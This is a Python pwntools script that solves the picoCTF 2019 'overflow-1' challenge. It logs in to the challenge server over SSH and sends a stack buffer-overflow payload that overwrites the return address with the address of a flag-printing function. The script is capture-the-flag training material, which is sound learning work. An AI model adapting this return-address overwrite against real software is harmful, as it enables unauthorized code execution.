from os import environ
from pwn import *

PATH='/problems/overflow-1_6_0a7153ff536ac8779749bc2dfa4735de'
EXEC='vuln'

flag_call_adr = 0x080485e6

send = (0x48+4)*b'x' + p32(flag_call_adr)

s = ssh(host='2019shell1.picoctf.com',
        user=environ["PICOUSER"],
        password=environ["PICOPSWD"])

sh = s.process(EXEC, cwd=PATH)

sh.sendlineafter('Give me a string and lets see what happens: ', send)

x = sh.recvrepeat()

print(x.decode(errors='ignore'))

s.close()